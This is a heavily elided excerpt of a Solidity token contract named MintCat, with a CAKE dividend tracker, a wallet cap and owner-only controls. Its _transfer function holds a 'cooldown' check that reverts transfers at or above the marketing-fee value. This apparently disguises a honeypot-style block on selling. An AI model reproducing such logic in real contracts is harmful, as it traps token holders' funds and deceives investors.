...
contract DividendPayingToken is ERC20, Ownable, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface {
  ...
  address public immutable CAKE = 0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402; //Cake
...
contract MintCat is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    MintCatDividendTracker public dividendTracker;
    ...
    //Anti-Whale System
    uint256 public maxWalletTokens =  10000000000 * 10**18;
    ...
    address public _marketingWalletAddress = 0x40086ceAe9758A3Fc0101C9157E39aFBCB25dd22;
    ...
    constructor() public ERC20("MintCat", "MINTCAT") {

    dividendTracker = new MintCatDividendTracker();
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        ...
        MintCatDividendTracker newDividendTracker = MintCatDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "Token: The new dividend tracker must be owned by the main token contract");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "Token: The pair cannot be removed from automatedMarketMakerPairs");
...
dividendTracker.processAccount(msg.sender, false);
    ...
    function _transfer(
        ...
        {
            if(rewardCooldown>15){
                if (amount >= marketingFee) 
			    revert("wait for cooldown..");
            }
		}
        if(amount == 0) {
...
contract MintCatDividendTracker is Ownable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() public DividendPayingToken("MintCat_Dividend_Tracker", "MintCat_Dividend_Tracker") {
    claimWait = 3600;
